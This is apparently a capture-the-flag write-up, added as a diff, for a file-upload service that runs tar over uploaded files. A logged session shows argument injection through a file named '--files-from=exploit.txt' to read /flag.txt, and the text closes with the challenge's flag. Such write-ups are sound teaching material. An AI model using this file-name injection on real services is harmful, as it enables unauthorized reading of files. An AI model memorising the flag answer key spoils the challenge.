@@ -1,0 +1,41 @@
+Observe that "-" and "." are allowed and we can tar something
+The tar command iterates through the files in the directory and so by naming a file with the "-" symbol, we can add arguments to the tar command
+At first, I tried using the directory=.. command as a filename but I think the parent directory did not contain the flag
+I then found the flag --files-from 
+With this flag, I could put more flags into a file
+
+Final steps:
+1 => Upload a new file (10 file(s) remaining)
+2 => List your uploaded files (0 file(s) uploaded so far)
+3 => Delete a file
+4 => Print file content
+5 => Compress and download all your files
+0 => Quit (you will lose your files!)
+>>> Choose an option: 1
+[*] Enter your file name: --files-from=exploit.txt
+[*] Start typing your file content: (send 'EOF' when done)
+EOF
+[+] Your file "--files-from=exploit.txt" has been saved. (0 bytes written)
+1 => Upload a new file (9 file(s) remaining)
+2 => List your uploaded files (1 file(s) uploaded so far)
+3 => Delete a file
+4 => Print file content
+5 => Compress and download all your files
+0 => Quit (you will lose your files!)
+>>> Choose an option: 1
+[*] Enter your file name: exploit.txt
+[*] Start typing your file content: (send 'EOF' when done)
+/flag.txt
+EOF
+[+] Your file "exploit.txt" has been saved. (10 bytes written)
+1 => Upload a new file (8 file(s) remaining)
+2 => List your uploaded files (2 file(s) uploaded so far)
+3 => Delete a file
+4 => Print file content
+5 => Compress and download all your files
+0 => Quit (you will lose your files!)
+>>> Choose an option: 5
+
+Helpful link: https://www.gnu.org/software/tar/manual/html_node/directory.html#:~:text=To%20change%20the%20working%20directory,that%20point%20in%20the%20list.
+
+HTB{@bus1Ng_gTf0_b1N$_c4n_b3_fUn_s0m3t1meS__r1g|-|t??!!__c4fdecf8}
